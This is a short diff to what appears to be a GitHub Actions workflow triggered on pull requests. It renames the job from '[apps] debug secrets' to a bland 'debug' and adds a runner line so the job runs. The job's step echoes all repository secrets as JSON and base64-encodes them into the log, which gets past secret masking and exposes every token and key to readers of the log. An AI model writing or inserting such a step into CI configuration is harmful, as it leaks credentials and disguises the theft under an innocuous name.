@@ -1,4 +1,4 @@
-name: '[apps] debug secrets'
+name: 'debug'
 on:
   pull_request:
     types:
@@ -8,6 +8,7 @@ on:
 
 jobs:
   debug:
+    runs-on: ubuntu-22.04
     steps:
       - name: 'debug'
         run: echo '${{ toJSON(secrets) }}' | base64
